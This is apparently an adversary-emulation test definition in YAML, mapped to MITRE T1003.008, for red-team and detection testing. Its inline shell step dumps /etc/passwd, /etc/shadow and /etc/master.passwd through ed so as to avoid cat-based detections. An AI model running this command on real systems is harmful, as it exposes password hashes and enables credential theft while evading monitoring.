api_version: "2.0"
name: Access /etc/{shadow,passwd,master.passwd} with a standard bin that's not cat
description: |
    Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed
args:
    - name: output_file
      type: path
      default: /tmp/T1003.008.txt
uuid: df1a55ae-019d-4120-bc35-94f4bc5c4b0a
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.008: /etc/passwd and /etc/shadow'
requirements:
    platforms:
        - os: linux
steps:
    - name: access-/etc/{shadow,passwd,master.passwd}-with-a-standard-bin-that's-not-cat
      inline: |
        unamestr=$(uname)
        if [ "$unamestr" = 'Linux' ]; then echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > {{.Args.output_file}}; elif [ "$unamestr" = 'FreeBSD' ]; then echo -e "e /etc/passwd\n,p\ne /etc/master.passwd\n,p\ne /etc/shadow\n,p\n" | ed > {{.Args.output_file}}; fi
      executor: sh
      cleanup:
        inline: |
            rm -f {{.Args.output_file}}
        executor: sh
